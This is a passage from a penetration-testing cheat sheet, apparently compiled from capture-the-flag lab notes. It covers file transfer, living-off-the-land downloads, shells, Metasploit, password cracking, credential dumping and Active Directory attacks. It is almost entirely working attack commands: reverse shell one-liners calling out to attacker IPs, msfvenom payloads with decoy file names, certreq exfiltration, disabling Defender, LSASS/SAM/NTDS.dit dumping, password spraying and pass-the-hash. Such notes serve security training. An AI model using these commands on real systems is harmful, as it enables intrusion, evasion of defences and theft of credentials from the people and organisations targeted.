sudo nc -l -p 443 -q 0 < SharpKatz.exe
nc 192.168.49.128 443 > SharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

### PowerShell Remoting copy
```powershell
$Session = New-PSSession -ComputerName DATABASE01
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### RDP drive mounting
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

---

## 18. AES Encryption PowerShell Module (Invoke-AESEncryption)

> Included verbatim as reference. Save as `Invoke-AESEncryption.ps1` then import.

```powershell
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}

                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

Import + example:
```powershell
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

OpenSSL AES (Linux):
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

---

## 19. Living Off the Land (LOL)

- Windows LOL: `https://lolbas-project.github.io/#`
- Linux LOL: `https://gtfobins.github.io/`

### certreq exfil trick (example)
```text
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

Listener:
```bash
sudo nc -lvnp 8000
```

### OpenSSL “server” download trick
Attacker:
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Target:
```bash
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

### Bitsadmin / BITS
```text
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil download
```text
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

---

## 20. User Agents (PowerShell)

List UAs:
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |
 Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Use Chrome UA:
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

---

## 21. Shells / Payloads / Interactivity

### Netcat listener
```bash
nc -lvnp 7777
```

### Bind shell (server-side)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

### Reverse shell (Windows PowerShell)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Disable Defender realtime monitoring (example)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Netcat/Bash reverse (Linux)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

### msfvenom stageless payloads
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

### Spawn TTY / interactive shells
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e "os.execute('/bin/sh')"
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
```

### Tomcat WAR reverse shell (example)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.129.204.126 LPORT=4444 -f war -o shell.war
```

---

## 22. Metasploit Basics

Paths:
```bash
ls /usr/share/metasploit-framework/modules
ls /usr/share/metasploit-framework/plugins/
ls /usr/share/metasploit-framework/scripts/
ls /usr/share/metasploit-framework/tools/
```

Install / launch:
```bash
sudo apt update && sudo apt install metasploit-framework
msfconsole
```

Module types:
- Auxiliary, Encoders, Exploits, NOPs, Payloads, Plugins, Post

Core commands (examples):
```text
search <term>
search <term> type:exploit
use 0
info
show options
set RHOSTS <target>
show targets
set target <index>
show payloads
set payload <index>
```

msfvenom examples:
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

DB setup (example):
```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb run
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

Workspaces / import:
```text
workspace
workspace -a Target_1
db_import Target.xml
hosts
services
db_nmap -sV -sS 10.10.10.8
db_export -h
creds -h
loot -h
```

Sessions / jobs:
```text
sessions
sessions -i 1
background
jobs -h
exploit -j
jobs -l
```

Meterpreter:
```text
hashdump
lsa_dump_sam
lsa_dump_secrets
```

Custom module load:
```bash
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
msfconsole -m /usr/share/metasploit-framework/modules/
msf6> loadpath /usr/share/metasploit-framework/modules/
msf6> reload_all
```

---

## 23. Password Cracking (John / Hashcat) + Wordlists

Quick hashes:
```bash
echo -n Soccer06! | md5sum
echo -n Soccer06! | sha256sum
```

Wordlists:
- rockyou: `https://github.com/brannondorsey/naive-hashcat/...`
- SecLists: `https://github.com/danielmiessler/SecLists`

John examples:
```bash
john --single passwd
john --wordlist=<wordlist_file> <hash_file>
john --incremental <hash_file>
hashid -j 193069ceb0461e1d40d216e32c79c704
```

Convert to john formats:
```text
<tool> <file_to_crack> > file.hash
```

Examples:
```bash
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash

office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show

zip2john ZIP.zip > zip.hash
```

Hashcat general syntax:
```text
hashcat -a <attack_mode> -m <hash_type> <hashes> <wordlist/rule/mask...>
```

Examples:
```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Mask example:
```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

Mask charset symbols:
| Symbol | Charset |
|---|---|
| `?l` | lowercase |
| `?u` | uppercase |
| `?d` | digits |
| `?h` | hex lowercase |
| `?H` | hex uppercase |
| `?s` | special |
| `?a` | `?l?u?d?s` |
| `?b` | `0x00-0xff` |

Rule snippets:
| Rule | Meaning |
|---|---|
| `:` | no-op |
| `l` | lowercase |
| `u` | uppercase |
| `c` | capitalize |
| `sXY` | substitute X→Y |
| `$!` | append `!` |

Apply rules:
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

CeWL:
```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
wc -l inlane.wordlist
```

---

## 24. Credential Hunting / Files / Logs (Linux)

Find encrypted docs:
```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nFile extension: " $ext
  find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

Find SSH keys:
```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
ssh-keygen -yf ~/.ssh/id_ed25519
```

Crack OpenSSL-encrypted tarball (example):
```bash
for i in $(cat rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k "$i" 2>/dev/null | tar xz
done
```

Bitlocker (example workflow):
```bash
bitlocker2john -i Backup.vhd > backup.hashes
hashcat -a 0 -m 22100 '<bitlocker_hash>' /usr/share/wordlists/rockyou.txt

sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker /media/bitlockermount
sudo losetup -f -P Backup.vhd
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

Config file hunting:
```bash
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: " $i
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```

DB file hunting:
```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

Notes:
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Script hunting:
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

Cron / history:
```bash
cat /etc/crontab
ls -la /etc/cron.*/
tail -n5 /home/*/.bash*
```

Logs (search patterns):
```bash
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: " $i
    grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null
  fi
done
```

Tools:
- Mimipenguin: `https://github.com/huntergregal/mimipenguin`
- LaZagne: `https://github.com/AlessandroZ/LaZagne`
- firefox_decrypt: `https://github.com/unode/firefox_decrypt`
- PCredz: `https://github.com/lgandx/PCredz`

Firefox creds:
```bash
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/*.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

---

## 25. Windows Creds / Hashes / Dumping

Windows registry hives:
| Hive | Description |
|---|---|
| `HKLM\SAM` | Local user password hashes |
| `HKLM\SYSTEM` | Boot key for SAM decryption |
| `HKLM\SECURITY` | LSA secrets (cached creds/DPAPI/etc.) |

Save hives:
```text
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

Impacket secretsdump (local):
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Crack NT hashes:
```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Crack DCC2:
```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

Mimikatz basics:
```text
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

NetExec remote dumps:
```bash
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
netexec smb 10.129.42.198 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --sam
```

LSASS dump approaches:
- Task Manager → Create dump file (saves in `%temp%`)

Find PID:
```text
tasklist /svc
Get-Process lsass
```

Dump with comsvcs:
```text
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsass_PID> C:\lsass.dmp full
```

Parse with pypykatz:
```text
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

Vault / saved creds:
```text
rundll32 keymgr.dll,KRShowKeyMgr
cmdkey /list
runas /savecred /user:SRV01\mcharles cmd
```

---

## 26. Bruteforce / Spraying / Default Creds

NetExec install + usage:
```bash
sudo apt-get -y install netexec
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
netexec winrm 10.129.42.197 -u user.list -p password.list
```

Evil-WinRM install:
```bash
sudo gem install evil-winrm
evil-winrm -i <target-IP> -u <username> -p <password>
```

Hydra examples:
```bash
hydra -L user.list -P password.list ssh://10.129.42.197
hydra -L user.list -P password.list rdp://10.129.42.197
hydra -L user.list -P password.list smb://10.129.42.197
hydra -C user_pass.list ssh://10.100.38.23
```

Metasploit SMB login:
```text
msf6 > use auxiliary/scanner/smb/smb_login
```

NetExec share enum:
```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

Password spraying:
```bash
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'

crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

Default creds cheat-sheet tool:
```bash
pip3 install defaultcreds-cheat-sheet
creds search linksys
```

---

## 27. NTDS.dit Dumping (AD)

Create shadow:
```text
vssadmin CREATE SHADOW /For=C:
```

Copy NTDS.dit:
```text
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Move to SMB share:
```text
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

Extract hashes:
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

NetExec module shortcut:
```bash
netexec smb 10.129.201.57 -u bwilliamson -p 'P@55w0rd!' -M ntdsutil
```

Pass-the-hash with evil-winrm:
```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

---

## 28. Kerberos Tickets / Keytabs / Pivot Notes

KeyTab / ccache discovery:
```bash
realm list
ps -ef | grep -i "winbind\|sssd"
find / -name *keytab* -ls 2>/dev/null
crontab -l
env | grep -i krb5
ls -la /tmp
```

Keytab usage:
```bash
klist -k -t /opt/specialfiles/carlos.keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
smbclient //dc01/carlos -k -c ls
```

Extract keytab hashes:
```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

Import ccache:
```bash
cp /tmp/krb5cc_* .
export KRB5CCNAME=/root/krb5cc_...
klist
smbclient //dc01/C$ -k -c ls -no-pass
```

Pivot checklist (chisel socks example):
1. Add hostnames/IPs to `/etc/hosts`
2. Configure proxychains (`socks5 127.0.0.1 1080`)
3. Download chisel + start server (reverse)
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse
```
4. Run client on target (example)
```text
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
5. Use Kerberos tools via proxychains (example)
```bash
proxychains impacket-wmiexec dc01 -k
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

---

## 29. ADCS / PtC / Shadow Credentials (references)

> Commands preserved as provided for reference; validate paths, templates, and environment before use.

```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
export KRB5CCNAME=/tmp/jpinkman.ccache
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```
## 30. Crackmapexec Usage For Auth Attacks

Enumerating Logged in Users:
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

Extract Hashes from SAM Database
```bash
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
Pass-the-Hash (PtH)
```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
---

**End of notes.**
